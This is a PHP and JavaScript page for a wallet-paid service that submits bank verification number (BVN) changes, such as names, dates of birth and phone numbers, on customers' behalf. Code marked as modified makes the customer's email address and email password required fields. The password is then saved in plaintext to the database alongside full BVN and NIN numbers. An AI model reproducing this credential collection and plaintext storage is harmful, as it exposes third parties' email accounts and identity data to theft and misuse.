<?php
// === PHP LOGIC STARTS HERE ===

session_start();
require_once "db.php";

if (!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true) {
    header("location: login.php");
    exit;
}

$banks = [
    'first_bank' => 'First Bank', 'keystone_bank' => 'Keystone Bank',
    'heritage_bank' => 'Heritage Bank', 'Agency_bvn' => 'Agency BVN ',
    'fcmb_bank' => 'Fcmb Bank', 'other' => 'NIBSS/Agric Microfinance Bank (+₦500 Surcharge)'
];
$surcharge = 500;
$dob_surcharge_amount = 3500; // Surcharge for DOB difference > 5 years

$prices = [];
$sql_prices = "SELECT service_key, service_name, price FROM services WHERE category = 'BVN Modification'";
if ($result_prices = $conn->query($sql_prices)) {
    while ($row = $result_prices->fetch_assoc()) {
        $key = str_replace(['bvn_', '_mod'], '', $row['service_key']);
        $prices[$key] = ['price' => $row['price'], 'label' => $row['service_name']];
    }
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    header('Content-Type: application/json');
    $userId = $_SESSION["id"];
    
    // Build details string, now including Old/New DOB
    $details = "BVN: "."***".substr($_POST['bvn'], -4) . "\nNIN: " ."***".substr($_POST['nin'], -4) . "\n"; // Masking for display
    if (isset($_POST['firstName'])) $details .= "New Name: " . $_POST['firstName'] . " " . $_POST['surname'] . " ". (empty($_POST['middleName']) ? '' : $_POST['middleName']) . "\n";
    if (isset($_POST['oldDob']) && !empty($_POST['oldDob'])) $details .= "Old DOB: " . $_POST['oldDob'] . "\n";
    if (isset($_POST['newDob']) && !empty($_POST['newDob'])) $details .= "New DOB: " . $_POST['newDob'] . "\n";
    if (isset($_POST['newPhone'])) $details .= "New Phone: " . $_POST['newPhone'] . "\n";

    // === MODIFIED PHP (1 of 2) ===
    // Add masked customer email/pass to the display details
    if (isset($_POST['customer_email']) && !empty($_POST['customer_email'])) $details .= "Customer Email: " . $_POST['customer_email'] . "\n";
    if (isset($_POST['customer_password']) && !empty($_POST['customer_password'])) $details .= "Customer Password: ***\n"; // Mask password
    // === END MODIFIED PHP ===

    // This is a NEW request. Calculate cost and charge the user.
    $bank_key = $_POST['bank'] ?? '';
    $mod_key = $_POST['modType'] ?? '';
    
    $base_cost = $prices[$mod_key]['price'] ?? 0;
    // Ensure base_cost is a number
    $totalCost = floatval($base_cost);
    
    $bank_name = $banks[$bank_key] ?? 'Unknown';
    
    if ($bank_key === 'other') { 
        $totalCost += $surcharge; 
    }
    
    if ($base_cost == 0 || $bank_name === 'Unknown') { 
        echo json_encode(['status' => 'error', 'message' => 'Invalid selection.']); 
        exit; 
    }
    
    // Check for DOB surcharge
    $dobSurchargeApplied = false;
    $dobSurchargeMessage = "";
    if (isset($_POST['oldDob']) && !empty($_POST['oldDob']) && isset($_POST['newDob']) && !empty($_POST['newDob'])) {
        try {
            $oldDob = new DateTime($_POST['oldDob']);
            $newDob = new DateTime($_POST['newDob']);
            $diff = $oldDob->diff($newDob);
            
            // Get total days difference
            $totalDaysDiff = $diff->days; 
            // 5 years * 365 days + 1 day for at least one leap year
            $fiveYearsInDays = (365 * 5) + 1; 

            // Check if the total days difference is greater than 5 years
            if ($totalDaysDiff > $fiveYearsInDays) {
                $totalCost += $dob_surcharge_amount;
                $dobSurchargeApplied = true;
                $dobSurchargeMessage = "\nA ₦" . number_format($dob_surcharge_amount) . " surcharge was added because the DOB difference is over 5 years.";
            }
        } catch (Exception $e) {
            // Ignore invalid date formats; client-side should prevent this
        }
    }
    
    // Start transaction
    $conn->autocommit(FALSE);
    
    // 1. Check balance
    $stmt_check = $conn->prepare("SELECT wallet_balance FROM users WHERE id = ? FOR UPDATE");
    $stmt_check->bind_param("i", $userId);
    $stmt_check->execute();
    $currentBalance = $stmt_check->get_result()->fetch_assoc()['wallet_balance'];
    $stmt_check->close();
    
    if ($currentBalance < $totalCost) { 
        echo json_encode(['status' => 'error', 'message' => 'Insufficient wallet balance. Your balance is ₦' . number_format($currentBalance) . ' but the total cost is ₦' . number_format($totalCost)]); 
        $conn->rollback(); 
        exit; 
    }
    
    // 2. Update wallet
    $newBalance = $currentBalance - $totalCost;
    $stmt_wallet = $conn->prepare("UPDATE users SET wallet_balance = ? WHERE id = ?");
    $stmt_wallet->bind_param("di", $newBalance, $userId);
    
    // 3. Create transaction log
    $description = "Payment for " . $prices[$mod_key]['label'];
    if ($dobSurchargeApplied) {
        $description .= " (+₦" . number_format($dob_surcharge_amount) . " DOB Surcharge)";
    }
    $stmt_trans = $conn->prepare("INSERT INTO transactions (user_id, type, amount, description) VALUES (?, 'debit', ?, ?)");
    $stmt_trans->bind_param("ids", $userId, $totalCost, $description);
    
    // 4. Create the request
    // We save the FULL details to the DB, not the masked version
    $full_details = "BVN: " . $_POST['bvn'] . "\nNIN: " . $_POST['nin'] . "\n";
    if (isset($_POST['firstName'])) $full_details .= "New Name: " . $_POST['firstName'] . " " . $_POST['surname'] . " ". (empty($_POST['middleName']) ? '' : $_POST['middleName']) . "\n";
    if (isset($_POST['oldDob']) && !empty($_POST['oldDob'])) $full_details .= "Old DOB: " . $_POST['oldDob'] . "\n";
    if (isset($_POST['newDob']) && !empty($_POST['newDob'])) $full_details .= "New DOB: " . $_POST['newDob'] . "\n";
    if (isset($_POST['newPhone'])) $full_details .= "New Phone: " . $_POST['newPhone'] . "\n";

    // === MODIFIED PHP (2 of 2) ===
    // Add full customer email/pass to the database details
    if (isset($_POST['customer_email']) && !empty($_POST['customer_email'])) $full_details .= "Customer Email: " . $_POST['customer_email'] . "\n";
    if (isset($_POST['customer_password']) && !empty($_POST['customer_password'])) $full_details .= "Customer Password: " . $_POST['customer_password'] . "\n"; // Save full password
    // === END MODIFIED PHP ===

    $stmt_req = $conn->prepare("INSERT INTO bvn_requests (user_id, bank, modification_type, bvn, details, cost) VALUES (?, ?, ?, ?, ?, ?)");
    $stmt_req->bind_param("issssd", $userId, $bank_name, $prices[$mod_key]['label'], $_POST['bvn'], $full_details, $totalCost);
    
    // Commit or rollback
    if ($stmt_wallet->execute() && $stmt_trans->execute() && $stmt_req->execute()) { 
        $conn->commit(); 
        echo json_encode(['status' => 'success', 'message' => 'Request submitted!' . $dobSurchargeMessage]); 
    } 
    else { 
        $conn->rollback(); 
        echo json_encode(['status' => 'error', 'message' => 'Transaction failed. Please try again.']); 
    }
    $stmt_wallet->close(); 
    $stmt_trans->close(); 
    $stmt_req->close();
    
    $conn->close(); 
    exit;
}


// Fetch user's request history, including the result file path
$requests = [];
$sql = "SELECT id, bank, modification_type, details, status, rejection_reason, result_file_path, request_date FROM bvn_requests WHERE user_id = ? ORDER BY request_date DESC";
if ($stmt = $conn->prepare($sql)) {
    $stmt->bind_param("i", $_SESSION["id"]);
    $stmt->execute();
    $result = $stmt->get_result();
    while ($row = $result->fetch_assoc()) { 
        // Mask sensitive data for display
        $row['details'] = preg_replace('/(BVN: )\d+(\d{4})/', '$1***$2', $row['details']);
        $row['details'] = preg_replace('/(NIN: )\d+(\d{4})/', '$1***$2', $row['details']);
        $requests[] = $row; 
    }
    $stmt->close();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BVN Modification</title>
    <style>
        /* */
        *, *::before, *::after {
            box-sizing: border-box;
        }
        body {
            margin: 0;
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            background-color: #f8fafc; /* Consistent background */
        }
        /* */
        
        .container { width: 100%; max-width: 800px; margin: 0 auto; padding: 1rem; }
        .card { background-color: #ffffff; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); margin-bottom: 2rem; }
        .page-header { text-align: center; margin-bottom: 2rem; margin-top: 1rem;}
        h1 { font-size: 2rem; color: #1e293b; margin: 0; }
        .page-header p { color: #64748b; margin-top: 0.25rem; }
        .btn { display: inline-flex; align-items: center; justify-content: center; gap: 0.5rem; padding: 0.75rem 1.25rem; border: none; font-weight: 600; border-radius: 8px; cursor: pointer; text-decoration: none; }
        .btn-primary { background-color: #4f46e5; color: white; width: 100%; }
        .btn-primary:disabled { background-color: #9ca3af; }
        .btn-secondary { background-color: #ffffff; color: #64748b; border: 1px solid #e2e8f0; font-size: 0.9rem; padding: 0.5rem 1rem;}
        .card-header, .card-body { padding: 1.5rem; }
        .card-header { border-bottom: 1px solid #e2e8f0; }
        .form-group { margin-bottom: 1.5rem; }
        label { display: block; font-weight: 500; margin-bottom: 0.5rem; }
        input, select { 
            /* box-sizing: border-box; <-- This is now handled by the global rule */
            width: 100%; 
            padding: 0.75rem 1rem; 
            border: 1px solid #e2e8f0; 
            border-radius: 8px; 
            font-size: 1rem; 
            margin-top: 0.25rem;
            font-family: inherit; /* Ensures form fields use the new body font */
        }
        .price-display { text-align: center; font-size: 1.5rem; font-weight: 700; margin: 2rem 0; padding: 1rem; background-color: #f8fafc; border-radius: 8px; color: #4f46e5; }
        .terms-group {
            display: flex;
            align-items: flex-start;
            gap: 0.75rem; 
            margin-top: 1.5rem;
        }
        .terms-group input {
            width: auto; 
            margin-top: 0.2em; 
            flex-shrink: 0; 
        }
        .terms-group label {
            margin-bottom: 0;
            font-weight: 400; 
        }
        .result { margin-top: 1rem; text-align: center; padding: 1rem; border-radius: 8px; }
        .result.success { background-color: #dcfce7; color: #166534; }
        .result.error { background-color: #fee2e2; color: #991b1b; }
        
        .status-badge { padding: 0.25rem 0.75rem; border-radius: 999px; font-size: 0.8rem; font-weight: 600; text-transform: capitalize; }
        .status-badge.pending { background-color: #fef9c3; color: #854d0e; }
        .status-badge.processing { background-color: #cff4fc; color: #055160; }
        .status-badge.rejected { background-color: #fee2e2; color: #991b1b; }
        .status-badge.completed { background-color: #dcfce7; color: #166534; }
        .rejection-reason { 
            font-size: 0.9rem; color: #991b1b; margin-top: 0.5rem; padding: 0.75rem; 
            background-color: #fff1f2; border-left: 4px solid #991b1b; border-radius: 6px;
            white-space: pre-wrap;
        }

        /* === ADDED CSS === */
        .important-notice {
            padding: 1rem;
            background-color: #fffbeb; /* Light yellow */
            border-left: 4px solid #f59e0b; /* Amber */
            color: #b45309;
            font-size: 0.9rem;
            margin-top: 1.5rem;
            margin-bottom: 1rem;
            border-radius: 6px;
        }
        .important-notice strong {
            color: #92400e;
            display: block;
            margin-bottom: 0.25rem;
        }
        /* === END ADDED CSS === */
        
        .history-list {
            display: flex;
            flex-direction: column;
            gap: 1.5rem; /* Space between cards */
        }
        .history-card {
            background-color: #ffffff;
            border-radius: 12px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
            border: 1px solid #e2e8f0;
            overflow: hidden; /* Ensures rounded corners are clean */
        }
        .history-card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1rem 1.5rem;
            background-color: #f8fafc;
            border-bottom: 1px solid #e2e8f0;
        }
        .history-card-header h3 {
            margin: 0;
            font-size: 1.1rem;
            color: #1e293b;
        }
        .history-card-body {
            padding: 1.5rem;
            display: grid;
            gap: 1.25rem;
        }
        .history-item {
            display: flex;
            flex-direction: column;
            gap: 0.25rem;
        }
        .history-item strong {
            font-weight: 600;
            color: #334155;
            font-size: 0.9rem;
        }
        .history-item span {
            color: #64748b;
            font-size: 0.95rem;
        }
        .history-item pre {
            font-family: inherit; /* Use the same font as the rest of the page */
            font-size: 0.9rem;
            color: #475569;
            background-color: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 6px;
            padding: 0.75rem;
            white-space: pre-wrap; /* Respects line breaks */
            margin: 0;
        }
        .history-card-footer {
            padding: 1rem 1.5rem;
            background-color: #f8fafc;
            border-top: 1px solid #e2e8f0;
        }
        .no-history {
            text-align: center;
            padding: 2rem;
            color: #64748b;
        }
        #dobWarning {
            color: #991b1b; 
            font-size: 0.9rem; 
            margin-top: 0.75rem; 
            padding: 0.5rem;
            background-color: #fff1f2;
            border-radius: 6px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="page-header">
            <h1>BVN Modification</h1>
            <p>Submit your BVN modification requests below.</p>
            <a href="dashboard.php" class="btn btn-secondary back-link"><i class="fas fa-arrow-left"></i> Back to Dashboard</a>
        </div>
        <div class="card">
            <div class="card-header"><h3>New Request Form</h3></div>
            <div class="card-body">
                <form id="modForm" method="POST">
                    <div class="form-group"><label>1. Select Bank</label><select id="bank" name="bank" required><option value="">-- Choose a Bank --</option><?php foreach ($banks as $key => $name): ?><option value="<?php echo $key; ?>"><?php echo $name; ?></option><?php endforeach; ?></select></div>
                    <div class="form-group"><label>2. Select Modification Type</label><select id="modType" name="modType" required><option value="">-- Choose Modification --</option><?php foreach ($prices as $key => $details): ?><option value="<?php echo $key; ?>"><?php echo $details['label']; ?></option><?php endforeach; ?></select></div>
                    <div class="form-group"><label>3. Your Details (Required)</label><input type="text" name="bvn" placeholder="Enter BVN (11 digits)" required><input type="text" name="nin" placeholder="Enter NIN (11 digits)" required style="margin-top: 1rem;"></div>
                    <div id="modificationFields"></div>
                    <div class="price-display"><span>Request Cost:</span><span id="displayPrice">₦0.00</span></div>
                    
                    <div class="terms-group">
                        <input type="checkbox" id="terms" name="terms" required>
                        <label for="terms">I confirm the details provided are correct and I authorize Mkolo Digital to use them for this BVN modification request.</label>
                    </div>
                    
                    <button type="submit" class="btn btn-primary" style="margin-top: 1rem;" disabled>Submit Request</button>
                </form>
                <div id="resultBox" class="result"></div>
            </div>
        </div>
        
        <div class="card">
            <div class="card-header"><h3>Your Modification History</h3></div>
            <div class="card-body">
                <div class="history-list">
                    <?php if (empty($requests)): ?>
                        <div class="no-history">No modification requests yet.</div>
                    <?php else: foreach ($requests as $request): ?>
                        <div class="history-card">
                            <div class="history-card-header">
                                <h3><?php echo htmlspecialchars($request['modification_type']); ?></h3>
                                <span class="status-badge <?php echo strtolower($request['status']); ?>"><?php echo htmlspecialchars($request['status']); ?></span>
                            </div>
                            <div class="history-card-body">
                                <div class="history-item">
                                    <strong>Date Submitted:</strong>
                                    <span><?php echo date("d M Y, g:i a", strtotime($request['request_date'])); ?></span>
                                </div>
                                <div class="history-item">
                                    <strong>Bank:</strong>
                                    <span><?php echo htmlspecialchars($request['bank']); ?></span>
                                </div>
                                <div class="history-item">
                                    <strong>Submitted Details:</strong>
                                    <pre><?php echo htmlspecialchars($request['details']); ?></pre>
                                </div>
                            </div>
                            
                            <?php if ($request['status'] === 'Rejected' || ($request['status'] === 'Completed' && !empty($request['result_file_path']))): ?>
                                <div class="history-card-footer">
                                    <?php if ($request['status'] === 'Rejected'): ?>
                                        <div class="rejection-reason">
                                            <strong>Reason:</strong> <?php echo htmlspecialchars($request['rejection_reason']); ?><br>
                                            <strong style="color: #166534;">(This request was canceled and your wallet was refunded.)</strong>
                                        </div>
                                    <?php endif; ?>
                                    
                                    <?php if ($request['status'] === 'Completed' && !empty($request['result_file_path'])): ?>
                                        <a href="<?php echo htmlspecialchars($request['result_file_path']); ?>" class="btn btn-secondary" download><i class="fas fa-download"></i> Download Result</a>
                                    <?php endif; ?>
                                </div>
                            <?php endif; ?>
                        </div>
                    <?php endforeach; endif; ?>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const modForm = document.getElementById('modForm');
            const bankSelect = document.getElementById('bank');
            const modTypeSelect = document.getElementById('modType');
            const modificationFieldsContainer = document.getElementById('modificationFields');
            const displayPriceEl = document.getElementById('displayPrice');
            const submitButton = document.querySelector('#modForm button[type="submit"]');
            const termsCheckbox = document.getElementById('terms');
            const resultBox = document.getElementById('resultBox');
            
            const prices = <?php echo json_encode($prices); ?>;
            const surcharge = <?php echo $surcharge; ?>;
            const dobSurchargeAmount = <?php echo $dob_surcharge_amount; ?>;

            function checkFormValidity() {
                const isModTypeSelected = modTypeSelect.value !== "";
                const areTermsChecked = termsCheckbox.checked;
                submitButton.disabled = !(isModTypeSelected && areTermsChecked);
            }

            // This function calculates the price and updates the UI
            function calculateAndUpdatePrice() {
                const bank = bankSelect.value;
                const modType = modTypeSelect.value;
                let cost = 0;
                let dobSurcharge = 0;
                const dobWarningEl = document.getElementById('dobWarning');
                if (dobWarningEl) dobWarningEl.style.display = 'none'; // Hide by default

                if (modType) {
                    cost = parseFloat(prices[modType]?.price) || 0;
                    
                    if (bank === 'other') {
                        cost += surcharge;
                    }

                    // Check for DOB surcharge
                    if (modType.includes('dob')) {
                        const oldDobEl = document.getElementById('oldDob');
                        const newDobEl = document.getElementById('newDob');

                        if (oldDobEl && newDobEl && oldDobEl.value && newDobEl.value) {
                            try {
                                const oldDob = new Date(oldDobEl.value);
                                const newDob = new Date(newDobEl.value);
                                
                                // Calculate difference in days
                                const msPerDay = 1000 * 60 * 60 * 24;
                                const diffInMs = Math.abs(newDob.getTime() - oldDob.getTime());
                                const diffInDays = Math.floor(diffInMs / msPerDay);
                                
                                // 5 years * 365 days + 1 day for at least one leap year
                                const fiveYearsInDays = (365 * 5) + 1; // 1826 days
                                
                                if (diffInDays > fiveYearsInDays) {
                                    dobSurcharge = dobSurchargeAmount;
                                    if(dobWarningEl) {
                                        dobWarningEl.textContent = 'A ₦' + dobSurcharge.toLocaleString() + ' surcharge is applied because the DOB difference is more than 5 years.';
                                        dobWarningEl.style.display = 'block';
                                    }
                                }
                            } catch (e) {
                                // Invalid date, do nothing
                            }
                        }
                    }
                }
                
                let totalCost = cost + dobSurcharge;
                
                displayPriceEl.textContent = `₦${totalCost.toLocaleString()}`;
                checkFormValidity();
            }

            // This function just builds the dynamic form fields
            function updateFormFields() {
                const modType = modTypeSelect.value;
                modificationFieldsContainer.innerHTML = '';
                
                if (modType) {
                    let fieldsHtml = '<div class="form-group"><label>4. New Details</label>';
                    if (modType.includes('name')) {
                        fieldsHtml += `<input type="text" name="firstName" placeholder="First Name" required style="margin-bottom: 1rem;">`;
                        fieldsHtml += `<input type="text" name="surname" placeholder="Surname" required style="margin-bottom: 1rem;">`;
                        fieldsHtml += `<input type="text" name="middleName" placeholder="Middle Name (Optional)">`;
                    }
                    if (modType.includes('dob')) {
                        fieldsHtml += '<label style="margin-top: 1rem; font-weight: 500;">Old Date of Birth:</label>';
                        fieldsHtml += '<input type="date" name="oldDob" id="oldDob" required>';
                        fieldsHtml += '<label style="margin-top: 1rem; font-weight: 500;">New Date of Birth:</label>';
                        fieldsHtml += '<input type="date" name="newDob" id="newDob" required>';
                        fieldsHtml += '<div id="dobWarning"></div>'; // Add a warning div
                    }
                    if (modType.includes('phone')) {
                        fieldsHtml += `<input type="tel" name="newPhone" placeholder="New Phone Number" required style="margin-top: 1rem;">`;
                    }

                    // === MODIFIED JAVASCRIPT ===
                    // Add the new notice and fields here
                    fieldsHtml += `
                        <div class="important-notice">
                            <strong>Important Notice</strong>
                            You must provide the customer's email and password. This is required to fill the form for them.
                        </div>
                        <label style="margin-top: 1rem; font-weight: 500;">Customer's Email:</label>
                        <input type="email" name="customer_email" placeholder="Enter customer's email" required style="margin-bottom: 1rem;">
                        <label style="font-weight: 500;">Customer's Email Password:</label>
                        <input type="password" name="customer_password" placeholder="Enter customer's email password" required>
                    `;
                    // === END MODIFIED JAVASCRIPT ===

                    fieldsHtml += '</div>';
                    modificationFieldsContainer.innerHTML = fieldsHtml;

                    // Add event listeners to new DOB fields
                    if (modType.includes('dob')) {
                        document.getElementById('oldDob').addEventListener('change', calculateAndUpdatePrice);
                        document.getElementById('newDob').addEventListener('change', calculateAndUpdatePrice);
                    }
                }
                
                calculateAndUpdatePrice(); // Calculate price after fields are added
            }

            // Event Listeners
            bankSelect.addEventListener('change', calculateAndUpdatePrice);
            modTypeSelect.addEventListener('change', updateFormFields);
            termsCheckbox.addEventListener('change', checkFormValidity);
            
            modForm.addEventListener('submit', function(event) {
                event.preventDefault();
                resultBox.className = 'result';
                resultBox.textContent = 'Submitting...';
                submitButton.disabled = true; // Prevent double-click
                
                const formData = new FormData(modForm);
                fetch('bvn-mod.php', { method: 'POST', body: formData })
                .then(response => response.json())
                .then(data => {
                    resultBox.textContent = data.message;
                    resultBox.className = 'result ' + data.status; // 'result success' or 'result error'
                    if (data.status === 'success') {
                        setTimeout(() => {
                            window.location.href = 'bvn-mod.php';
                        }, 2000);
                    } else {
                        submitButton.disabled = false; // Re-enable button on failure
                    }
                })
                .catch(error => { 
                    resultBox.textContent = 'An unexpected error occurred.';
                    resultBox.className = 'result error';
                    submitButton.disabled = false;
                });
            });
            
        });
    </script>
</body>
</html>
